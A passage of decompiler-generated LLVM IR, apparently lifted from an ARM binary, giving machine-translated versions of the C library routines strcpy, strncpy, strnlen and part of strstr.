  uselistorder label %dec_label_pc_15d1c, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_15e101 = load i32, i32* @r1, align 4
  %v1_15e102 = inttoptr i32 %v0_15e101 to i8*
  %v2_15e103 = load i8, i8* %v1_15e102, align 1
  %v2_15e145 = icmp eq i8 %v2_15e103, 0
  store i1 %v2_15e145, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_15e103, i8* %arg1, align 1
  br i1 %v2_15e145, label %dec_label_pc_15e20, label %dec_label_pc_15e08

dec_label_pc_15e08:                               ; preds = %entry, %dec_label_pc_15e08
  %v0_15e08 = load i32, i32* @r1, align 4
  %v1_15e08 = add i32 %v0_15e08, 1
  store i32 %v1_15e08, i32* @r1, align 4
  %v0_15e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_15e0c = add i32 %v0_15e0c, 1
  store i32 %v1_15e0c, i32* %r2.global-to-local, align 4
  %v1_15e10 = inttoptr i32 %v1_15e08 to i8*
  %v2_15e10 = load i8, i8* %v1_15e10, align 1
  %v2_15e14 = icmp eq i8 %v2_15e10, 0
  store i1 %v2_15e14, i1* %cpsr_z.global-to-local, align 1
  %v3_15e18 = inttoptr i32 %v1_15e0c to i8*
  store i8 %v2_15e10, i8* %v3_15e18, align 1
  %v0_15e1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e1c, label %dec_label_pc_15e20, label %dec_label_pc_15e08

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15e08, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_15e08, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_15e24 = icmp eq i32 %arg2, 3
  store i1 %v7_15e24, i1* %cpsr_z.global-to-local, align 1
  %v0_15e28 = load i32, i32* @lr, align 4
  store i32 %v0_15e28, i32* %stack_var_-4, align 4
  %v1_15e2c = add i32 %arg1, -1
  store i32 %v1_15e2c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_15ea8, label %dec_label_pc_15e34

dec_label_pc_15e34:                               ; preds = %entry
  %v3_15e34 = udiv i32 %arg2, 4
  store i32 %v3_15e34, i32* %lr.global-to-local, align 4
  %v0_15e38.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15e34
  %v2_15e40 = phi i32 [ %v6_15e78, %dec_label_pc_15e84 ], [ %v1_15e2c, %dec_label_pc_15e34 ]
  %v0_15e38 = phi i32 [ %v1_15e88, %dec_label_pc_15e84 ], [ %v0_15e38.pre, %dec_label_pc_15e34 ]
  %v1_15e38 = inttoptr i32 %v0_15e38 to i8*
  %v2_15e38 = load i8, i8* %v1_15e38, align 1
  %v3_15e38 = zext i8 %v2_15e38 to i32
  store i32 %v3_15e38, i32* %r3.global-to-local, align 4
  %v2_15e3c = icmp eq i8 %v2_15e38, 0
  store i1 %v2_15e3c, i1* %cpsr_z.global-to-local, align 1
  %v3_15e40 = add i32 %v2_15e40, 1
  %v4_15e40 = inttoptr i32 %v3_15e40 to i8*
  store i8 %v2_15e38, i8* %v4_15e40, align 1
  %v5_15e40 = load i32, i32* @ip, align 4
  %v6_15e40 = add i32 %v5_15e40, 1
  store i32 %v6_15e40, i32* @ip, align 4
  %v0_15e44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e44, label %dec_label_pc_15e94, label %dec_label_pc_15e48

dec_label_pc_15e48:                               ; preds = %dec_label_pc_15e38
  %v0_15e48 = load i32, i32* @r1, align 4
  %v1_15e48 = add i32 %v0_15e48, 1
  %v2_15e48 = inttoptr i32 %v1_15e48 to i8*
  %v3_15e48 = load i8, i8* %v2_15e48, align 1
  %v4_15e48 = zext i8 %v3_15e48 to i32
  store i32 %v4_15e48, i32* %r3.global-to-local, align 4
  %v2_15e4c = icmp eq i8 %v3_15e48, 0
  store i1 %v2_15e4c, i1* %cpsr_z.global-to-local, align 1
  %v3_15e50 = add i32 %v5_15e40, 2
  %v4_15e50 = inttoptr i32 %v3_15e50 to i8*
  store i8 %v3_15e48, i8* %v4_15e50, align 1
  %v5_15e50 = load i32, i32* @ip, align 4
  %v6_15e50 = add i32 %v5_15e50, 1
  store i32 %v6_15e50, i32* @ip, align 4
  %v0_15e54 = load i32, i32* @r1, align 4
  %v1_15e54 = add i32 %v0_15e54, 1
  store i32 %v1_15e54, i32* %r1.global-to-local, align 4
  %v0_15e58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e58, label %dec_label_pc_15e94, label %dec_label_pc_15e5c

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e48
  %v1_15e5c = add i32 %v0_15e54, 2
  %v2_15e5c = inttoptr i32 %v1_15e5c to i8*
  %v3_15e5c = load i8, i8* %v2_15e5c, align 1
  %v4_15e5c = zext i8 %v3_15e5c to i32
  store i32 %v4_15e5c, i32* %r3.global-to-local, align 4
  %v2_15e60 = icmp eq i8 %v3_15e5c, 0
  store i1 %v2_15e60, i1* %cpsr_z.global-to-local, align 1
  %v3_15e64 = add i32 %v5_15e50, 2
  %v4_15e64 = inttoptr i32 %v3_15e64 to i8*
  store i8 %v3_15e5c, i8* %v4_15e64, align 1
  %v5_15e64 = load i32, i32* @ip, align 4
  %v6_15e64 = add i32 %v5_15e64, 1
  store i32 %v6_15e64, i32* @ip, align 4
  %v0_15e68 = load i32, i32* %r1.global-to-local, align 4
  %v1_15e68 = add i32 %v0_15e68, 1
  store i32 %v1_15e68, i32* %r1.global-to-local, align 4
  %v0_15e6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e6c, label %dec_label_pc_15e94, label %dec_label_pc_15e70

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e5c
  %v1_15e70 = add i32 %v0_15e68, 2
  %v2_15e70 = inttoptr i32 %v1_15e70 to i8*
  %v3_15e70 = load i8, i8* %v2_15e70, align 1
  %v4_15e70 = zext i8 %v3_15e70 to i32
  store i32 %v4_15e70, i32* %r3.global-to-local, align 4
  %v2_15e74 = icmp eq i8 %v3_15e70, 0
  store i1 %v2_15e74, i1* %cpsr_z.global-to-local, align 1
  %v3_15e78 = add i32 %v5_15e64, 2
  %v4_15e78 = inttoptr i32 %v3_15e78 to i8*
  store i8 %v3_15e70, i8* %v4_15e78, align 1
  %v5_15e78 = load i32, i32* @ip, align 4
  %v6_15e78 = add i32 %v5_15e78, 1
  store i32 %v6_15e78, i32* @ip, align 4
  %v0_15e7c = load i32, i32* %r1.global-to-local, align 4
  %v1_15e7c = add i32 %v0_15e7c, 1
  store i32 %v1_15e7c, i32* %r1.global-to-local, align 4
  %v0_15e80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e80, label %dec_label_pc_15e94, label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e70
  %v0_15e84 = load i32, i32* %lr.global-to-local, align 4
  %v1_15e84 = add i32 %v0_15e84, -1
  store i32 %v1_15e84, i32* %lr.global-to-local, align 4
  %v7_15e84 = icmp eq i32 %v0_15e84, 1
  store i1 %v7_15e84, i1* %cpsr_z.global-to-local, align 1
  %v1_15e88 = add i32 %v0_15e7c, 2
  store i32 %v1_15e88, i32* @r1, align 4
  br i1 %v7_15e84, label %dec_label_pc_15ea8, label %dec_label_pc_15e38

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e70, %dec_label_pc_15e5c, %dec_label_pc_15e48, %dec_label_pc_15e38
  %v1_15e94 = phi i32 [ %v6_15e78, %dec_label_pc_15e70 ], [ %v6_15e64, %dec_label_pc_15e5c ], [ %v6_15e50, %dec_label_pc_15e48 ], [ %v6_15e40, %dec_label_pc_15e38 ]
  %v2_15e941 = sub i32 %arg1, %v1_15e94
  %v2_15e98 = add i32 %v2_15e941, %arg2
  %v1_15e9c = add i32 %v2_15e98, -1
  store i32 %v1_15e9c, i32* %r3.global-to-local, align 4
  %v7_15e9c = icmp eq i32 %v2_15e98, 1
  store i1 %v7_15e9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15e9c, label %dec_label_pc_15ed8, label %dec_label_pc_15ec8

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e84, %entry
  %v2_15eb87 = phi i32 [ %v1_15e2c, %entry ], [ %v6_15e78, %dec_label_pc_15e84 ]
  %v1_15ea8 = urem i32 %arg2, 4
  store i32 %v1_15ea8, i32* %r3.global-to-local, align 4
  %v2_15ea8 = icmp eq i32 %v1_15ea8, 0
  store i1 %v2_15ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ea8, label %dec_label_pc_15ed8, label %dec_label_pc_15eb0

dec_label_pc_15eb0:                               ; preds = %dec_label_pc_15ea8, %dec_label_pc_15ec0.dec_label_pc_15eb0_crit_edge
  %v2_15eb8 = phi i32 [ %v6_15eb8, %dec_label_pc_15ec0.dec_label_pc_15eb0_crit_edge ], [ %v2_15eb87, %dec_label_pc_15ea8 ]
  %v0_15eb4 = phi i32 [ %v0_15eb4.pre, %dec_label_pc_15ec0.dec_label_pc_15eb0_crit_edge ], [ %v1_15ea8, %dec_label_pc_15ea8 ]
  %v0_15eb0 = load i32, i32* @r1, align 4
  %v1_15eb0 = inttoptr i32 %v0_15eb0 to i8*
  %v2_15eb0 = load i8, i8* %v1_15eb0, align 1
  %v3_15eb0 = zext i8 %v2_15eb0 to i32
  store i32 %v3_15eb0, i32* %r2.global-to-local, align 4
  %v5_15eb0 = add i32 %v0_15eb0, 1
  store i32 %v5_15eb0, i32* @r1, align 4
  %v1_15eb4 = add i32 %v0_15eb4, -1
  store i32 %v1_15eb4, i32* %r3.global-to-local, align 4
  %v7_15eb4 = icmp eq i32 %v0_15eb4, 1
  store i1 %v7_15eb4, i1* %cpsr_z.global-to-local, align 1
  %v3_15eb8 = add i32 %v2_15eb8, 1
  %v4_15eb8 = inttoptr i32 %v3_15eb8 to i8*
  store i8 %v2_15eb0, i8* %v4_15eb8, align 1
  %v5_15eb8 = load i32, i32* @ip, align 4
  %v6_15eb8 = add i32 %v5_15eb8, 1
  store i32 %v6_15eb8, i32* @ip, align 4
  %v0_15ebc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ebc, label %dec_label_pc_15ed8, label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15eb0
  %v0_15ec0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ec0 = icmp eq i32 %v0_15ec0, 0
  store i1 %v2_15ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ec0, label %dec_label_pc_15ec8, label %dec_label_pc_15ec0.dec_label_pc_15eb0_crit_edge

dec_label_pc_15ec0.dec_label_pc_15eb0_crit_edge:  ; preds = %dec_label_pc_15ec0
  %v0_15eb4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15eb0

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15ec0, %dec_label_pc_15e94
  %v2_15ed010 = phi i32 [ %v1_15e94, %dec_label_pc_15e94 ], [ %v6_15eb8, %dec_label_pc_15ec0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15ecc

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15ecc.dec_label_pc_15ecc_crit_edge, %dec_label_pc_15ec8
  %v2_15ed0 = phi i32 [ %v6_15ed0, %dec_label_pc_15ecc.dec_label_pc_15ecc_crit_edge ], [ %v2_15ed010, %dec_label_pc_15ec8 ]
  %v0_15ed0.off0 = phi i8 [ %extract.t, %dec_label_pc_15ecc.dec_label_pc_15ecc_crit_edge ], [ 0, %dec_label_pc_15ec8 ]
  %v0_15ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_15ecc = add i32 %v0_15ecc, -1
  store i32 %v1_15ecc, i32* %r3.global-to-local, align 4
  %v7_15ecc = icmp eq i32 %v0_15ecc, 1
  store i1 %v7_15ecc, i1* %cpsr_z.global-to-local, align 1
  %v3_15ed0 = add i32 %v2_15ed0, 1
  %v4_15ed0 = inttoptr i32 %v3_15ed0 to i8*
  store i8 %v0_15ed0.off0, i8* %v4_15ed0, align 1
  %v5_15ed0 = load i32, i32* @ip, align 4
  %v6_15ed0 = add i32 %v5_15ed0, 1
  store i32 %v6_15ed0, i32* @ip, align 4
  %v0_15ed4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ed4, label %dec_label_pc_15ed8, label %dec_label_pc_15ecc.dec_label_pc_15ecc_crit_edge

dec_label_pc_15ecc.dec_label_pc_15ecc_crit_edge:  ; preds = %dec_label_pc_15ecc
  %v0_15ed0.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15ed0.pre to i8
  br label %dec_label_pc_15ecc

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15eb0, %dec_label_pc_15ecc, %dec_label_pc_15e94, %dec_label_pc_15ea8
  %v2_15ed8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15ed8, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15ed0, { 1, 0 }
  uselistorder i32 %v0_15ecc, { 1, 0 }
  uselistorder i32 %v6_15eb8, { 0, 2, 1 }
  uselistorder i32 %v1_15ea8, { 2, 1, 0 }
  uselistorder i32 %v2_15e98, { 1, 0 }
  uselistorder i32 %v1_15e88, { 1, 0 }
  uselistorder i32 %v0_15e84, { 1, 0 }
  uselistorder i32 %v6_15e78, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ed8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_15eb0, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_15ee0 = icmp eq i32 %arg2, 0
  br i1 %v2_15ee0, label %bb, label %dec_label_pc_15ef4

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_15ef4:                               ; preds = %entry
  %v2_15ef4 = add i32 %tmp, %arg2
  %v3_15ef4 = icmp ult i32 %v2_15ef4, %tmp
  br i1 %v3_15ef4, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_15ef4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_15ef4, %bb19
  %v5_15f94 = phi i32 [ %v2_15ef4, %dec_label_pc_15ef4 ], [ -1, %bb19 ]
  %v1_15f144 = urem i32 %tmp, 4
  %v2_15f145 = icmp eq i32 %v1_15f144, 0
  br i1 %v2_15f145, label %dec_label_pc_15f1c, label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %bb20, %dec_label_pc_15f10
  %v0_15f10 = phi i32 [ %v1_15f10, %dec_label_pc_15f10 ], [ %tmp, %bb20 ]
  %v1_15f04 = inttoptr i32 %v0_15f10 to i8*
  %v2_15f04 = load i8, i8* %v1_15f04, align 1
  %v2_15f08 = icmp eq i8 %v2_15f04, 0
  br i1 %v2_15f08, label %dec_label_pc_15f90, label %dec_label_pc_15f10

dec_label_pc_15f10:                               ; preds = %dec_label_pc_15f04
  %v1_15f10 = add i32 %v0_15f10, 1
  %v1_15f14 = urem i32 %v1_15f10, 4
  %v2_15f14 = icmp eq i32 %v1_15f14, 0
  br i1 %v2_15f14, label %dec_label_pc_15f1c, label %dec_label_pc_15f04

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f10, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_15f10, %dec_label_pc_15f10 ]
  %v3_15f8030 = icmp ult i32 %storemerge.lcssa, %v5_15f94
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15f8030, label %dec_label_pc_15f24, label %dec_label_pc_15f90

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15f7c, %dec_label_pc_15f1c
  %v0_15f7437 = phi i32 [ %v4_15f24, %dec_label_pc_15f7c ], [ %storemerge.lcssa, %dec_label_pc_15f1c ]
  %v1_15f24 = inttoptr i32 %v0_15f7437 to i32*
  %v2_15f24 = load i32, i32* %v1_15f24, align 4
  %v4_15f24 = add i32 %v0_15f7437, 4
  %v2_15f28 = add i32 %v2_15f24, -16843009
  %v2_15f2c = and i32 %v2_15f28, -2139062144
  store i32 %v2_15f2c, i32* @ip, align 4
  %v2_15f30 = icmp eq i32 %v2_15f2c, 0
  br i1 %v2_15f30, label %dec_label_pc_15f7c, label %dec_label_pc_15f38

dec_label_pc_15f38:                               ; preds = %dec_label_pc_15f24
  %v2_15f38 = inttoptr i32 %v0_15f7437 to i8*
  %v3_15f38 = load i8, i8* %v2_15f38, align 1
  %v2_15f3c = icmp eq i8 %v3_15f38, 0
  br i1 %v2_15f3c, label %bb21, label %dec_label_pc_15f4c

bb21:                                             ; preds = %dec_label_pc_15f38
  br label %dec_label_pc_15f90

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f38
  %v1_15f4c = add i32 %v0_15f7437, 1
  %v2_15f4c = inttoptr i32 %v1_15f4c to i8*
  %v3_15f4c = load i8, i8* %v2_15f4c, align 1
  %v2_15f50 = icmp eq i8 %v3_15f4c, 0
  br i1 %v2_15f50, label %dec_label_pc_15f90, label %dec_label_pc_15f5c

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f4c
  %v1_15f5c = add i32 %v0_15f7437, 2
  %v2_15f5c = inttoptr i32 %v1_15f5c to i8*
  %v3_15f5c = load i8, i8* %v2_15f5c, align 1
  %v2_15f60 = icmp eq i8 %v3_15f5c, 0
  br i1 %v2_15f60, label %dec_label_pc_15f90, label %dec_label_pc_15f6c

dec_label_pc_15f6c:                               ; preds = %dec_label_pc_15f5c
  %v1_15f6c = add i32 %v0_15f7437, 3
  %v2_15f6c = inttoptr i32 %v1_15f6c to i8*
  %v3_15f6c = load i8, i8* %v2_15f6c, align 1
  %v2_15f70 = icmp eq i8 %v3_15f6c, 0
  br i1 %v2_15f70, label %dec_label_pc_15f90, label %dec_label_pc_15f7c

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15f6c, %dec_label_pc_15f24
  %v3_15f80 = icmp ult i32 %v4_15f24, %v5_15f94
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_15f80, label %dec_label_pc_15f24, label %dec_label_pc_15f90

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f7c, %dec_label_pc_15f1c, %dec_label_pc_15f04, %dec_label_pc_15f4c, %dec_label_pc_15f5c, %dec_label_pc_15f6c, %bb21
  %v1_15f90 = phi i32 [ %v0_15f7437, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_15f1c ], [ %v1_15f4c, %dec_label_pc_15f4c ], [ %v1_15f5c, %dec_label_pc_15f5c ], [ %v1_15f6c, %dec_label_pc_15f6c ], [ %v5_15f94, %dec_label_pc_15f7c ], [ %v0_15f10, %dec_label_pc_15f04 ]
  %v3_15f90 = icmp uge i32 %v5_15f94, %v1_15f90
  %v9_15f90 = icmp eq i32 %v5_15f94, %v1_15f90
  %v2_15f94 = xor i1 %v3_15f90, true
  %v3_15f94 = or i1 %v9_15f90, %v2_15f94
  br i1 %v3_15f94, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_15f90
  %v6_15f94 = sub i32 %v5_15f94, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_15f90, %bb22
  %v5_15f98 = phi i32 [ %v1_15f90, %dec_label_pc_15f90 ], [ %v6_15f94, %bb22 ]
  %v2_15f98 = xor i1 %v9_15f90, true
  %v3_15f98 = and i1 %v3_15f90, %v2_15f98
  br i1 %v3_15f98, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_15f98 = sub i32 %v5_15f98, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_15fa0 = phi i32 [ 0, %bb ], [ %v5_15f98, %bb23 ], [ %v6_15f98, %bb24 ]
  ret i32 %v1_15fa0

; uselistorder directives
  uselistorder i1 %v3_15f90, { 1, 0 }
  uselistorder i32 %v4_15f24, { 1, 0 }
  uselistorder i32 %v0_15f7437, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15f10, { 1, 0, 2 }
  uselistorder i32 %v5_15f94, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_15f90, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_15f04, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_15fb0 = load i8, i8* %arg2, align 1
  %v2_15fb4 = icmp eq i8 %v3_15fb0, 0
  %v1_160a4.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_15fb4, label %dec_label_pc_160a0, label %dec_label_pc_15fbc

dec_label_pc_15fbc:                               ; preds = %entry
  %v1_15fbc = add i32 %v1_160a4.pre, -1
  store i32 %v1_15fbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fc0

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15fcc, %dec_label_pc_15fbc
  %v0_15fc0 = phi i32 [ %v1_15fc0, %dec_label_pc_15fcc ], [ %v1_15fbc, %dec_label_pc_15fbc ]
  %v1_15fc0 = add i32 %v0_15fc0, 1
  %v2_15fc0 = inttoptr i32 %v1_15fc0 to i8*
  %v3_15fc0 = load i8, i8* %v2_15fc0, align 1
  store i32 %v1_15fc0, i32* %r0.global-to-local, align 4
  %v2_15fc4 = icmp eq i8 %v3_15fc0, 0
  br i1 %v2_15fc4, label %dec_label_pc_1609c, label %dec_label_pc_15fcc

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15fc0
  %v9_15fcc = icmp eq i8 %v3_15fc0, %v3_15fb0
  br i1 %v9_15fcc, label %dec_label_pc_15fd4, label %dec_label_pc_15fc0

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fcc
  %v2_15fd4 = add i32 %tmp, 1
  %v3_15fd4 = inttoptr i32 %v2_15fd4 to i8*
  %v4_15fd4 = load i8, i8* %v3_15fd4, align 1
  %v2_15fd8 = icmp eq i8 %v4_15fd4, 0
  br i1 %v2_15fd8, label %dec_label_pc_160a0, label %dec_label_pc_15fe4

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fd4
  %v1_15fe4 = add i32 %v0_15fc0, 2
  %v1_16038 = add i32 %tmp, 2
  %v2_16038 = inttoptr i32 %v1_16038 to i8*
  br label %dec_label_pc_16030

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_16090
  %v3_15ff4 = load i8, i8* %v3_16028.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16020.preheader

dec_label_pc_16020.preheader:                     ; preds = %dec_label_pc_15ff4, %dec_label_pc_16030
  %v0_160203.in = phi i8 [ %v3_15ff4, %dec_label_pc_15ff4 ], [ %v3_16028.pn, %dec_label_pc_16030 ]
  %v9_1602012 = icmp eq i8 %v0_160203.in, %v3_15fb0
  br i1 %v9_1602012, label %dec_label_pc_16028, label %dec_label_pc_16000

dec_label_pc_16000:                               ; preds = %dec_label_pc_16020.preheader, %dec_label_pc_1601c
  %v0_16008 = phi i32 [ %v1_1601c, %dec_label_pc_1601c ], [ %storemerge41, %dec_label_pc_16020.preheader ]
  %v0_16000.in = phi i8 [ %v3_1601c, %dec_label_pc_1601c ], [ %v0_160203.in, %dec_label_pc_16020.preheader ]
  %v2_16000 = icmp eq i8 %v0_16000.in, 0
  br i1 %v2_16000, label %dec_label_pc_1609c, label %dec_label_pc_16008

dec_label_pc_16008:                               ; preds = %dec_label_pc_16000
  %v1_16008 = add i32 %v0_16008, 1
  %v2_16008 = inttoptr i32 %v1_16008 to i8*
  %v3_16008 = load i8, i8* %v2_16008, align 1
  store i32 %v1_16008, i32* %r0.global-to-local, align 4
  %v9_1600c = icmp eq i8 %v3_16008, %v3_15fb0
  br i1 %v9_1600c, label %dec_label_pc_16028, label %dec_label_pc_16014

dec_label_pc_16014:                               ; preds = %dec_label_pc_16008
  %v2_16014 = icmp eq i8 %v3_16008, 0
  br i1 %v2_16014, label %dec_label_pc_1609c, label %dec_label_pc_1601c

dec_label_pc_1601c:                               ; preds = %dec_label_pc_16014
  %v1_1601c = add i32 %v0_16008, 2
  %v2_1601c = inttoptr i32 %v1_1601c to i8*
  %v3_1601c = load i8, i8* %v2_1601c, align 1
  store i32 %v1_1601c, i32* %r0.global-to-local, align 4
  %v9_16020 = icmp eq i8 %v3_1601c, %v3_15fb0
  br i1 %v9_16020, label %dec_label_pc_16028, label %dec_label_pc_16000

dec_label_pc_16028:                               ; preds = %dec_label_pc_16008, %dec_label_pc_1601c, %dec_label_pc_16020.preheader
  %v0_16028 = phi i32 [ %storemerge41, %dec_label_pc_16020.preheader ], [ %v1_16008, %dec_label_pc_16008 ], [ %v1_1601c, %dec_label_pc_1601c ]
  %v1_16028 = add i32 %v0_16028, 1
  br label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_15fe4, %dec_label_pc_16028
  %storemerge41 = phi i32 [ %v1_16028, %dec_label_pc_16028 ], [ %v1_15fe4, %dec_label_pc_15fe4 ]
  %v3_16028.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_16028.pn = load i8, i8* %v3_16028.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_16028.pn, %v4_15fd4
  br i1 %storemerge, label %dec_label_pc_16034, label %dec_label_pc_16020.preheader

dec_label_pc_16034:                               ; preds = %dec_label_pc_16030
  %v1_16034 = add i32 %storemerge41, 1
  %v2_16034 = inttoptr i32 %v1_16034 to i8*
  %v3_16034 = load i8, i8* %v2_16034, align 1
  %v4_16034 = zext i8 %v3_16034 to i32
  %v3_16038 = load i8, i8* %v2_16038, align 1
  %v4_16038 = zext i8 %v3_16038 to i32
  %v9_16040 = icmp eq i8 %v3_16034, %v3_16038
  %v1_16048 = add i32 %storemerge41, -1
  store i32 %v1_16048, i32* %r0.global-to-local, align 4
  br i1 %v9_16040, label %dec_label_pc_16050, label %dec_label_pc_16090

dec_label_pc_16050:                               ; preds = %dec_label_pc_16034, %dec_label_pc_16080
  %v0_16068 = phi i32 [ %v1_16070, %dec_label_pc_16080 ], [ %v1_16038, %dec_label_pc_16034 ]
  %v0_16060 = phi i32 [ %v1_1606c, %dec_label_pc_16080 ], [ %v1_16034, %dec_label_pc_16034 ]
  %v0_16050 = phi i32 [ %v4_16080, %dec_label_pc_16080 ], [ %v4_16034, %dec_label_pc_16034 ]
  %v2_16050 = icmp eq i32 %v0_16050, 0
  br i1 %v2_16050, label %dec_label_pc_160a0, label %dec_label_pc_16058

dec_label_pc_16058:                               ; preds = %dec_label_pc_16050
  %v1_16058 = add i32 %v0_16060, 1
  %v2_16058 = inttoptr i32 %v1_16058 to i8*
  %v3_16058 = load i8, i8* %v2_16058, align 1
  %v1_1605c = add i32 %v0_16068, 1
  %v2_1605c = inttoptr i32 %v1_1605c to i8*
  %v3_1605c = load i8, i8* %v2_1605c, align 1
  %v4_1605c = zext i8 %v3_1605c to i32
  store i32 %v1_16058, i32* @r1, align 4
  %v9_16064 = icmp eq i8 %v3_16058, %v3_1605c
  %v1_1606c = add i32 %v0_16060, 2
  %v1_16070 = add i32 %v0_16068, 2
  br i1 %v9_16064, label %dec_label_pc_16078, label %dec_label_pc_16090

dec_label_pc_16078:                               ; preds = %dec_label_pc_16058
  %v2_16078 = icmp eq i8 %v3_16058, 0
  br i1 %v2_16078, label %dec_label_pc_160a0, label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %dec_label_pc_16078
  %v2_16080 = inttoptr i32 %v1_16070 to i8*
  %v3_16080 = load i8, i8* %v2_16080, align 1
  %v4_16080 = zext i8 %v3_16080 to i32
  %v2_16084 = inttoptr i32 %v1_1606c to i8*
  %v3_16084 = load i8, i8* %v2_16084, align 1
  %v9_16088 = icmp eq i8 %v3_16084, %v3_16080
  br i1 %v9_16088, label %dec_label_pc_16050, label %dec_label_pc_16090

dec_label_pc_16090:                               ; preds = %dec_label_pc_16080, %dec_label_pc_16058, %dec_label_pc_16034
  %v0_16090 = phi i32 [ %v4_16038, %dec_label_pc_16034 ], [ %v4_16080, %dec_label_pc_16080 ], [ %v4_1605c, %dec_label_pc_16058 ]
